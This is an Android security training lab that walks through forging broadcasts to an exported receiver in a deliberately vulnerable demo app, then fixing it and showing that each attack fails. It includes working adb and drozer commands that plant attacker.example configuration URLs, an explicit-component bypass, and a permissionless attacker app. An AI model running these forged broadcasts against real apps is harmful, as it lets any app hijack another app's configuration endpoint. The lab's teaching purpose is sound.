# Lab 02 — Forge a broadcast at a vulnerable receiver

> **Objective.** Take a receiver from "it is exported" all the way to a demonstrated,
> persisted state change caused by an app that declares no permissions — then write the fix
> and prove the same attack stops working.

| | |
|---|---|
| **Difficulty** | Intermediate |
| **Time** | 2–3 hours |
| **Needs an installed lab app?** | **Yes** for Parts 3–6. Parts 1–2 run against any device. |
| **Needs root?** | No |
| **Chapter sections** | [§3.4](../README.md#34-protected-broadcasts--measured-not-remembered), [§5.2](../README.md#52-the-central-bug-a-forgeable-action-beside-a-protected-one), [§7.4](../README.md#74-which-actions-can-you-actually-forge) |

---

## Why this lab exists

The most common broadcast finding in real Android applications is written by a careful
developer following this reasoning:

> `BOOT_COMPLETED` is a protected broadcast. Only the system can send it. Therefore
> anything arriving at this receiver came from the system. Therefore I can trust it.

The first two sentences are true. The third does not follow, for two independent reasons —
and this lab makes you prove both, from an app, with a persisted result.

It also makes you do the thing most reports skip: **close the leads that are not real.** The
discipline of showing why an unguarded receiver is *not* exploitable is what makes your
"this one is" credible.

---

## Setup

### Install restriction — read this first

The device this chapter was measured on, a Redmi `M2101K6P` running MIUI 12.5 / Android 11,
**refuses every `adb install` with `INSTALL_FAILED_USER_RESTRICTED`.** That is an OEM policy
("Install via USB" is gated behind a vendor account check), not a fault in any APK and not
something a rebuild fixes.

If you hit it, you have three options:

| Option | Effect |
|---|---|
| **Use an emulator** for Parts 3–6 | Recommended. `avdmanager` or Android Studio; any API 26+ image works. |
| **Enable the vendor's "Install via USB"** developer option | Works if your account state permits it. |
| **Do Parts 1–2 on the real device** and the rest on an emulator | The classification work is more interesting on a real device anyway, because a real device has real apps. |

### Build the lab apps

```bash
# host
cd 29-BroadcastReceivers/examples
export ANDROID_HOME=~/Android/Sdk          # wherever your SDK is
./build.sh                                  # the vulnerable variant
adb install -r build/vault-vulnerable.apk
```

Read [`examples/build.sh`](../examples/build.sh) before running it. It uses `aapt2`,
`javac`, `d8` and `apksigner` directly — no Gradle — and it explains every step.

The app under test is `com.example.vault`, built from:

| Source | Role |
|---|---|
| [`ConfigSyncReceiver-vulnerable.java`](../examples/ConfigSyncReceiver-vulnerable.java) | The manifest receiver with six numbered bugs |
| [`VaultApplication.java`](../examples/VaultApplication.java) | Two more receivers registered at runtime, in no manifest |
| [`AndroidManifest-vulnerable.xml`](../examples/AndroidManifest-vulnerable.xml) | The declaration, with three annotated mistakes |

**Do not read the sources yet.** Do Parts 1 and 2 blind, as you would on a real target.

---

## Part 1 — Audit the declaration, and be wrong

### 1.1 Pull the APK and decode it

```bash
# host
adb shell pm path com.example.vault
adb pull /data/app/.../base.apk vault.apk
apktool d -f vault.apk -o work/
```

### 1.2 Count the receivers

```bash
# host
grep -A6 "<receiver" work/AndroidManifest.xml
```

Write down the number. Then hand the manifest to the chapter that owns manifest audits:

```bash
# host
# (paths below assume you are in 29-BroadcastReceivers/examples)
python3 ../../32-Manifest/scripts/manifest-audit.py work/AndroidManifest.xml
```

You should have found **two** receivers: `ConfigSyncReceiver` and `UpdateInterceptor`.

### 1.3 Note the three declaration mistakes

Without reading the annotated source, see how many you can spot from the manifest alone:

<details>
<summary><b>The three mistakes</b></summary>

1. **A `normal`-level custom permission.** `com.example.vault.permission.SYNC` is declared
   `protectionLevel="normal"`, which is granted automatically to any app that asks for it.
   A component guarded by it is not guarded. See
   [23-Permissions](../../23-Permissions/README.md).
2. **`<protected-broadcast>` in a third-party manifest.** It does nothing — the element is
   honoured only for platform-signed packages. Its presence means the developer copied a
   system manifest and believed the copy was working.
3. **`android:priority="2147483647"`.** `Integer.MAX_VALUE` on an ordered broadcast. Lab 03
   is about what that buys.

</details>

### 1.4 Now be wrong

```bash
# host — start the app so its process exists, then look at reality
adb shell "am start -n com.example.vault/.MainActivity"
python3 -B ../scripts/receiver-surface.py --package com.example.vault
```

Reference shape of the output:

```
--- com.example.vault  (2 registrations, uid 10xxx)
  com.example.vault   pid=NNNN uid=10xxx (third-party app) user=0  [remote]
    Filter #0: NO sender permission  <-- any app that can name the action reaches this receiver
        action: com.example.vault.ACTION_WIPE_CACHE
  com.example.vault   pid=NNNN uid=10xxx (third-party app) user=0  [remote]
    Filter #0: NO sender permission  <-- any app that can name the action reaches this receiver
        action: com.example.vault.SYNC_COMPLETE
```

**Two more receivers, in no manifest.** Your audit was 50 % complete and you had no way to
know.

Confirm that PackageManager agrees they do not exist:

```bash
# host
adb shell "cmd package query-receivers --brief -a com.example.vault.ACTION_WIPE_CACHE"
```

```
No receivers found
```

> **✅ Checkpoint 1.**
> You produced a receiver count from the manifest, then produced a different one from the
> device, and can explain the difference in one sentence.

---

## Part 2 — Classify the actions

You now have four actions. Only some of them are worth your time.

```bash
# host
cat > actions.txt <<'EOF'
android.intent.action.BOOT_COMPLETED
com.example.vault.ACTION_SYNC_CONFIG
com.example.vault.ACTION_WIPE_CACHE
com.example.vault.SYNC_COMPLETE
EOF

bash ../scripts/protected-broadcast-map.sh --check actions.txt
```

Reference:

```
  ACTION                                                         STATIC     DYNAMIC
  ----------------------------------------------------------------------------------
  android.intent.action.BOOT_COMPLETED                           PROTECTED  -
  com.example.vault.ACTION_SYNC_CONFIG                           forgeable  -
  com.example.vault.ACTION_WIPE_CACHE                            forgeable  -
  com.example.vault.SYNC_COMPLETE                                forgeable  -
```

One protected, three forgeable. Confirm the protected one by hand, because you should see
the enforcement message at least once with your own eyes:

```bash
# host
adb shell "am broadcast -a android.intent.action.BOOT_COMPLETED"
```

```
java.lang.SecurityException: Permission Denial: not allowed to send broadcast
android.intent.action.BOOT_COMPLETED from pid=NNNN, uid=2000
```

**Note the `uid=2000`.** That is `adb shell`, which is *more* privileged than an app. If
shell cannot send it, no app can. A refusal here is a reliable "protected".

> **⚠️ Warning**
> Do not conclude the reverse from `adb shell` alone. Shell being *allowed* to send an
> action does not automatically mean everything about your attack works from an app — the
> protected-broadcast check is uid-based, so that specific conclusion does transfer, but
> reachability of the *receiver* still has to be proven from an app. Parts 4 and 5.

---

## Part 3 — See what the receiver actually does

You know `ACTION_SYNC_CONFIG` is forgeable. You do not yet know whether it matters.

### 3.1 Hook the app

```bash
# host — spawn, so registrations in Application.onCreate are caught
frida -U -f com.example.vault -l ../scripts/hook-broadcast.js
```

In the REPL:

```
bc.watch()
```

You should see the two runtime registrations, **with their class names** — which nothing
else on the system can give you:

```
[registerReceiver] ContextWrapper(2 args)
    class      : com.example.vault.VaultApplication$1
    export     : EXPORTED (pre-33 default, 2-arg)  <-- ANY app can send to this receiver
    action   : com.example.vault.ACTION_WIPE_CACHE
    priority : 0

[registerReceiver] ContextWrapper(2 args)
    class      : com.example.vault.VaultApplication$SyncResultWatcher
    export     : EXPORTED (pre-33 default, 2-arg)  <-- ANY app can send to this receiver
    action   : com.example.vault.SYNC_COMPLETE
    priority : 999
```

Note `VaultApplication$1` — an **anonymous inner class**. A tool that greps for classes
extending `BroadcastReceiver` by name finds nothing. Measured in the wild on a stock
device: `com.miui.calculator.CalculatorApplication$1`, exactly this shape.

Note also `priority : 999` on the second one. Park that for Lab 03.

### 3.2 Fire and watch

From a second terminal:

```bash
# host
adb shell "am broadcast -a com.example.vault.ACTION_SYNC_CONFIG \
    -p com.example.vault \
    --es config_url https://attacker.example/c.json --ez force true"
```

In the Frida output:

```
[deliver] MANIFEST-declared receiver
    component  : com.example.vault.ConfigSyncReceiver
    exported   : true
    permission : NONE
    action   : com.example.vault.ACTION_SYNC_CONFIG
    extra[config_url] = https://attacker.example/c.json
    extra[force] = true
```

The receiver ran with your data. **That is still not a finding.** A receiver running is not
a consequence.

> **✅ Checkpoint 3.**
> You have the class names of two receivers that appear in no manifest, and you have watched
> a forged broadcast reach `onReceive` with attacker-controlled extras.

---

## Part 4 — Find the consequence

### 4.1 Look for persistence

```bash
# host — the app is debuggable in this build, so run-as works
adb shell "run-as com.example.vault cat shared_prefs/vault_config.xml"
```

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="config_url">https://attacker.example/c.json</string>
</map>
```

**There it is.** A single unauthenticated broadcast, from a process holding no permissions,
permanently changed the endpoint the app will use for every subsequent configuration fetch.

### 4.2 Prove it survives

```bash
# host
adb shell "am force-stop com.example.vault"
adb shell "am start -n com.example.vault/.MainActivity"
adb shell "run-as com.example.vault cat shared_prefs/vault_config.xml"
adb logcat -d -s ConfigSync | tail -5
```

The value is still there, and the app fetches from it. Persistence is what turns Medium
into High.

### 4.3 Now the second reason the developer's reasoning fails

The filter is not the only way in. An `<intent-filter>` constrains **implicit** resolution
only. Name the component and the filter is not consulted at all:

```bash
# host — no action whatsoever
adb shell "am broadcast -n com.example.vault/.ConfigSyncReceiver \
    --es config_url https://attacker.example/round2.json --ez force true"
adb shell "run-as com.example.vault cat shared_prefs/vault_config.xml"
```

The value changed again, and `getAction()` inside `onReceive` was `null`. Every branch that
does not test the action still ran.

This is why "check the action as the first statement of `onReceive`" is not paranoia. See
[26-Intent §3.2](../../26-Intent/README.md) for the resolution rules this sidesteps.

> **✅ Checkpoint 4.**
> You have a persisted, attacker-controlled value in the victim's private storage, produced
> two different ways — through the filter and around it.

---

## Part 5 — Prove it from an app, not from a shell

Everything so far was done as uid 2000. That is not an attacker.

### 5.1 Why it matters, measured

Two ways `adb shell` differs from an app, both measured on the reference device:

| Difference | Evidence |
|---|---|
| **`am broadcast` sends an ORDERED broadcast** | A plain `am broadcast -a X` produced a history record reading `ordered=true`, and a Frida hook inside a receiving app confirmed `ordered=true` at delivery. An app's `sendBroadcast()` is unordered. |
| **Shell is privileged** | Root (uid 0) successfully sent `android.intent.action.LOCALE_CHANGED`; uid 2000 was refused the same action. Privilege changes the answer. |

### 5.2 Build the attacker

[`AttackerBroadcaster.java`](../examples/AttackerBroadcaster.java) is the app. It declares
**no permissions at all** — write its manifest yourself, which is the exercise
[`build.sh`](../examples/build.sh) deliberately leaves you:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.attacker.bcast">
    <application android:label="bcast">
        <activity android:name=".AttackerBroadcaster" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

Notice what is absent: any `<uses-permission>` element. **That is the finding's severity
argument in one line.**

### 5.3 Run it

```bash
# host
adb install -r build/attacker.apk
adb shell "run-as com.example.vault rm -f shared_prefs/vault_config.xml"   # reset
adb shell "am start -n com.attacker.bcast/.AttackerBroadcaster"
adb shell "run-as com.example.vault cat shared_prefs/vault_config.xml"
adb logcat -d -s attacker | tail -20
```

The same persisted change, from an ordinary app, with no permissions and no user
interaction beyond launching the attacker.

### 5.4 If you cannot install

Use **drozer**, whose agent is an ordinary app and therefore a valid reachability oracle:

```
dz> run app.broadcast.info -a com.example.vault
dz> run app.broadcast.send --action com.example.vault.ACTION_SYNC_CONFIG \
        --extra string config_url https://attacker.example/c.json \
        --extra boolean force true
```

If you can do neither, **say so in the report**. "Reproduced from `adb shell` only;
app-context reproduction not possible on the test device due to an OEM install restriction"
is honest and useful. Claiming an app-level attack you did not run is not.

> **✅ Checkpoint 5.**
> The state change was produced by a process holding zero permissions.

---

## Part 6 — Fix it, and prove the fix

A finding without a fix is half a report.

### 6.1 Read the fixed source

```bash
# host
diff -u ../examples/ConfigSyncReceiver-vulnerable.java \
        ../examples/ConfigSyncReceiver-fixed.java | less
diff -u ../examples/AndroidManifest-vulnerable.xml \
        ../examples/AndroidManifest-fixed.xml | less
```

The four structural changes, in order of value:

| # | Change | Why it is first / last |
|---|---|---|
| 1 | **Split the receiver.** One receiver, one action, one trust level. The boot hook keeps `BOOT_COMPLETED` and nothing else. | Removes the entire class rather than mitigating it. |
| 2 | **Move the sensitive path out of the manifest** into a runtime registration with `RECEIVER_NOT_EXPORTED` (or the AndroidX backport below API 33). | A component that is not declared cannot be started by another app and cannot wake the process. |
| 3 | **Check `getAction()` as the first statement** of every `onReceive`. | One line, defends against the explicit-component bypass, and survives someone flipping `exported` later. |
| 4 | **Allowlist instead of sanitising.** The broadcast selects an environment *name*; the URL is derived from a compile-time map. | Nothing attacker-controlled reaches a sink. |

Plus the manifest changes: `signature` instead of `normal`, `<protected-broadcast>` deleted,
the `Integer.MAX_VALUE` priority deleted, and `android:exported` stated explicitly
everywhere.

### 6.2 Build and install the fixed variant

```bash
# host
./build.sh --fixed
adb uninstall com.example.vault
adb install -r build/vault-fixed.apk
adb shell "am start -n com.example.vault/.MainActivity"
```

### 6.3 Run every attack again

```bash
# host — 1. the implicit forge
adb shell "am broadcast -a com.example.vault.ACTION_SYNC_CONFIG \
    -p com.example.vault --es config_env staging"

# host — 2. the explicit bypass (the component no longer exists)
adb shell "am broadcast -n com.example.vault/.ConfigSyncReceiver --ez force true"

# host — 3. the boot receiver with a wrong action
adb shell "am broadcast -n com.example.vault/.BootReceiver --es config_url http://evil"

# host — 4. from the attacker app
adb shell "am start -n com.attacker.bcast/.AttackerBroadcaster"

# host — verify nothing moved
adb shell "run-as com.example.vault cat shared_prefs/vault_config.xml"
adb logcat -d -s VaultBoot ConfigSync | tail -20
```

Expected results:

| Attack | Result | Because |
|---|---|---|
| 1 | Not delivered, or refused | The receiver is registered `NOT_EXPORTED` (or behind the AndroidX signature permission) |
| 2 | `Error: Activity class ... does not exist` or no delivery | The component is no longer declared in the manifest |
| 3 | `refusing unexpected action: null` in logcat | The action check runs first |
| 4 | Nothing changes | Same reasons, from an app |

### 6.4 Verify the fix on the device, not just in the diff

```bash
# host
python3 -B ../scripts/receiver-surface.py --package com.example.vault
```

On API 33+ the registration reports `NOT_EXPORTED`. Below 33 it appears as a
`requiredPermission=` ending in `DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION` — the AndroidX
backport, and a **positive** finding.

> **✅ Checkpoint 6.**
> Every attack from Parts 3–5 fails, and you verified it against the live device rather
> than against the source diff.

---

## Part 7 — Write it up

Draft the finding as you would submit it. A model:

> **Title.** Unauthenticated broadcast permanently redirects the application's configuration
> endpoint
>
> **Severity.** High
>
> **Component.** `com.example.vault/.ConfigSyncReceiver`, exported, no permission
>
> **Summary.** The receiver is exported to receive `android.intent.action.BOOT_COMPLETED`, a
> protected broadcast. Its intent filter also lists `com.example.vault.ACTION_SYNC_CONFIG`,
> which is not protected (verified on the test device: the action was accepted and delivered
> where `BOOT_COMPLETED` was refused with a `SecurityException`). `onReceive` does not check
> `getAction()` and writes the `config_url` extra into `SharedPreferences`, where it is used
> for all later configuration fetches.
>
> **Impact.** Any application on the device, holding no permissions, can permanently
> redirect the target's configuration endpoint to a server it controls, with no user
> interaction. The value survives process restart and reboot.
>
> **Reproduction.** [attacker APK, 30 lines, no `<uses-permission>` elements] — plus the
> `run-as` output before and after.
>
> **Additional.** The receiver is also reachable by explicit component with no action at
> all, bypassing the intent filter entirely; and two further receivers registered at runtime
> in `VaultApplication` are absent from the manifest and were found only via
> `dumpsys activity broadcasts`.
>
> **Remediation.** [the four changes from 6.1, as code]
>
> **Testing limitations.** Reproduced from an installed attacker application on
> [device/emulator]. `adb shell` reproduction is not equivalent because `am broadcast`
> sends an ordered broadcast and shell runs at uid 2000.

Notice what carries the severity: not "exported receiver", but *persisted, attacker-chosen,
zero permissions, no user interaction*.

---

## Hints

<details>
<summary><b>Hint 1 — `run-as` says "not debuggable"</b></summary>

`run-as` only works for a debuggable build. `build.sh` signs with the debug keystore but
does not set `android:debuggable`. Either add it to the lab manifest, or read the file as
root on an emulator:

```bash
adb root
adb shell "cat /data/data/com.example.vault/shared_prefs/vault_config.xml"
```

On a production target you would not have either, which is why finding a *user-visible*
consequence matters more than reading private files.
</details>

<details>
<summary><b>Hint 2 — the broadcast is not reaching the app</b></summary>

Three usual causes, in order of likelihood:

1. **The app is in the stopped state.** Freshly installed and never opened.
   `FLAG_EXCLUDE_STOPPED_PACKAGES` is the default. Launch it once.
2. **API 26 implicit-broadcast limits.** Add `-p com.example.vault` to make the broadcast
   targeted, which is exempt.
3. **Your action string has a typo.** Confirm with
   `python3 receiver-surface.py --action <your action>`.
</details>

<details>
<summary><b>Hint 3 — Frida shows the registrations but never a delivery</b></summary>

Manifest receivers and runtime receivers use completely different delivery paths
([§4.4](../README.md#44-delivery-iintentreceiver-loadedapkreceiverdispatcher-activitythread)).
`bc.watch()` hooks both, but if you called `bc.registrations()` alone you have only the
registration side. Call `bc.deliveries()` too, or just `bc.watch()`.
</details>

<details>
<summary><b>Hint 4 — I want to see whether the extras leaked anywhere else</b></summary>

They did — into the broadcast history, in cleartext:

```bash
python3 -B ../scripts/receiver-surface.py --history --with-extras | grep -A4 ACTION_SYNC
```

Anything with shell access can read every broadcast payload sent in the last few minutes.
That is a second, independent finding about the app's use of broadcasts to carry data.
</details>

<details>
<summary><b>Hint 5 — the fixed app still receives my broadcast on API 30</b></summary>

Check which branch of `ConfigSyncReceiver.register()` ran. Below API 33 the fixed code uses
the four-argument overload with a signature permission; if the permission is not declared
in the manifest, or is declared `normal`, the guard does nothing. Verify:

```bash
adb shell "pm list permissions -f" | grep -A3 "com.example.vault.permission.INTERNAL_SYNC"
```

`protectionLevel` must read `signature`.
</details>

---

## Success criteria

- [ ] You produced a receiver count from the manifest and a different one from the device.
- [ ] You classified all four actions as protected or forgeable **on your device**.
- [ ] You saw the `Permission Denial: not allowed to send broadcast` message yourself.
- [ ] You recovered two receiver class names that appear in no manifest.
- [ ] You caused a **persisted** change in the victim's private storage.
- [ ] You reached the receiver **twice**: through the filter, and around it by component.
- [ ] You reproduced the attack from an app declaring **zero permissions** — or documented
      precisely why you could not.
- [ ] You built the fixed variant and showed every attack failing.
- [ ] You verified the fix against the live device, not just the diff.
- [ ] Your write-up states the impact, not the component state.

---

## What you should take away

**One.** "This action is protected" does not protect a *receiver*. It protects one action.
A second, unprotected action in the same filter opens the whole component.

**Two.** An intent filter constrains implicit resolution only. An exported receiver is
reachable by component with any action, or none. `getAction()` must be checked in code.

**Three.** A receiver running is not a consequence. Find the persisted change, or downgrade
the finding honestly.

**Four.** `adb shell` is uid 2000 and `am broadcast` sends ordered broadcasts. Reproduce
from an app, or say that you did not.

**Five.** The fix that removes the class — splitting the receiver so each has one trust
level — is worth more than the four mitigations that shore up the broken one.

---

## Next

- [Lab 03 — Ordered broadcasts and interception](lab-03-ordered-broadcasts-and-interception.md)
  — the `priority: 999` you parked in Part 3.
- [Lab 04 — CTF: the receiver that is not there](lab-04-ctf-the-receiver-that-is-not-there.md)
